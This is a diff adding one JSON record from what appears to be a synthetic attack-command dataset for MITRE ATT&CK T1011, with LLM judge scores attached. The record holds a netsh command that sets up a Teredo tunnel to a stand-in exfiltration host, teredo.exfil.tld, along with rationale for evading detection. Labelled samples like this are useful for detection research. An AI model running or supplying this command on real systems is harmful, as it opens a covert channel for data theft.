@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface teredo set state type=enterpriseclient servername=teredo.exfil.tld clientport=60445",
+  "explanation": "Enables Teredo with a custom server and high, uncommon UDP client port to establish an IPv6-over-IPv4 tunnel as an alternate medium for exfiltration, aligning with T1011.",
+  "rationale_steps": [
+    "Configure Teredo to create an IPv6 tunnel over IPv4/UDP, providing a non-primary channel.",
+    "Use a non-standard client port (60445) to evade simple detections.",
+    "Traffic over Teredo can carry exfil data outside normal monitored IPv4 paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-b376dc3c",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The netsh teredo set state command is properly formed with valid key=value parameters and no quoting or separator issues.",
+        "semantic_score": 2,
+        "semantic_justification": "While it can configure Teredo with a custom server and port, it typically requires administrative rights and aligns more with exfiltration over an alternative protocol than with T1011's other network medium.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-09-30T23:53:25.615077Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for the netsh interface teredo command, using proper parameter names and values with appropriate equals signs for assignment.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly configures Teredo tunneling to a custom server with a specific client port, which would effectively create an IPv6-over-IPv4 tunnel that could be used as an alternate network medium for exfiltration, precisely matching the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:53:31.280843Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax for `netsh`, correct parameters, and no obvious errors.",
+        "semantic_score": 3,
+        "semantic_justification": "The command correctly uses `netsh` to configure Teredo for exfiltration, aligning with T1011's concept, but the stated 'Privilege: None' makes it operationally unfeasible as this command requires administrative privileges to execute.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-09-30T23:53:47.604908Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
